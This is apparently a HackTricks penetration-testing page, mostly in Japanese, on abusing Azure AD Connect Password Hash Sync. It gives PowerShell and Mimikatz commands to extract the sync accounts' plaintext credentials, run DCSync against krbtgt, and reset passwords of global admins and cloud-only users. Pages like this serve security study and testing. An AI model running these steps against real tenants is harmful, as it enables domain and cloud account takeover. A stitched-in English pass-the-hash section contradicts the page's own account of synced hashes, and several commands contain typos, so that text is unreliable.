# PHS - パスワードハッシュ同期

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを見たい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## 基本情報

**パスワードハッシュ同期**は、ハイブリッドアイデンティティを実現するために使用されるサインイン方法の1つです。Azure AD Connectは、オンプレミスのActive DirectoryインスタンスからクラウドベースのAzure ADインスタンスにユーザーのパスワードのハッシュを同期します。

<figure><img src="../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

これは、企業がオンプレミスのADをAzure ADと同期させるために最も一般的に使用される方法です。

すべての**ユーザー**と**パスワードハッシュのハッシュ**がオンプレミスからAzure ADに同期されます。ただし、**平文のパスワード**や**元のハッシュ**はAzure ADに送信されません。\
さらに、**ビルトイン**セキュリティグループ（ドメイン管理者など）はAzure ADに**同期されません**。

ハッシュの同期は**2分ごと**に行われます。ただし、デフォルトでは、Azure ADでは**パスワードの有効期限**と**アカウントの有効期限**は**同期されません**。したがって、**オンプレミスのパスワードが期限切れ**（変更されていない）の場合でも、古いパスワードを使用してAzureリソースにアクセスし続けることができます。

オンプレミスのユーザーがAzureリソースにアクセスする場合、**認証はAzure ADで行われます**。

**PHS**は、Identity ProtectionやAAD Domain Servicesなどの機能に必要です。

## ピボット

PHSが構成されている場合、いくつかの**特権アカウント**が自動的に**作成**されます：

* アカウント**`MSOL_<installationID>`**は、オンプレミスのADで自動的に作成されます。このアカウントには**Directory Synchronization Accounts**ロール（[ドキュメント](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)を参照）が付与されており、オンプレミスのADで**レプリケーション（DCSync）権限**を持っています。
* アカウント**`Sync_<name of on-prem ADConnect Server>_installationID`**は、Azure ADで作成されます。このアカウントは、Azure ADの**任意のユーザー**（同期されたユーザーまたはクラウドのみのユーザー）のパスワードを**リセット**することができます。

前述の2つの特権アカウントのパスワードは、**Azure AD Connectがインストールされているサーバー**のSQLサーバーに**平文で保存**されています。管理者はこれらの特権ユーザーのパスワードを平文で抽出することができます。

**Azure AD Connectがインストールされているサーバー**がドメインに参加している場合（ドキュメントで推奨されている）、次のコマンドで見つけることができます：
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### AzureAD -> オンプレミス

In this section, we will discuss the technique of Pass-the-Hash (PtH) attack using Azure AD Connect in a hybrid identity environment. 

#### Introduction

Azure AD Connect is a tool provided by Microsoft that allows synchronization of on-premises Active Directory (AD) with Azure AD. This synchronization enables users to have a single identity across both on-premises and cloud environments. 

#### Password Hash Sync (PHS)

One of the synchronization methods provided by Azure AD Connect is Password Hash Sync (PHS). With PHS, the password hashes of on-premises AD users are synchronized to Azure AD. This allows users to authenticate against Azure AD using the same password they use for on-premises AD. 

#### Exploiting PHS for Lateral Movement

In a hybrid identity environment, where Azure AD is synchronized with on-premises AD using PHS, an attacker can exploit this synchronization to perform lateral movement. 

The attacker can obtain the password hash of an on-premises AD user from Azure AD. This can be done by compromising an account with sufficient privileges in Azure AD or by exploiting vulnerabilities in Azure AD Connect. 

Once the attacker has the password hash, they can use it to authenticate as the on-premises AD user on other systems within the on-premises network. This allows the attacker to move laterally and gain access to sensitive resources within the network. 

#### Mitigation

To mitigate the risk of Pass-the-Hash attacks using Azure AD Connect, the following measures can be taken:

1. Ensure that Azure AD Connect is up to date with the latest security patches and updates.
2. Implement strong access controls and least privilege principles for accounts used by Azure AD Connect.
3. Monitor and log activities related to Azure AD Connect for any suspicious behavior.
4. Regularly review and audit the configuration of Azure AD Connect to ensure it aligns with security best practices.
5. Implement multi-factor authentication (MFA) for Azure AD accounts to add an extra layer of security.

By following these mitigation measures, organizations can reduce the risk of Pass-the-Hash attacks and enhance the security of their hybrid identity environment.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
### オンプレミス -> AzureAD

`Sync_*` アカウントを侵害することで、グローバル管理者を含む任意のユーザーのパスワードを**リセット**することが可能です。
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
**クラウドのみのユーザーのパスワードを変更することも可能です**（予期しない場合でも）。
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
### シームレスSSO

PTAとシームレスSSOを使用することが可能であり、他の悪用に対して脆弱です。以下で確認してください：

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## 参考文献

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで広告表示したい**場合や、**最新版のPEASSを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう。

</details>
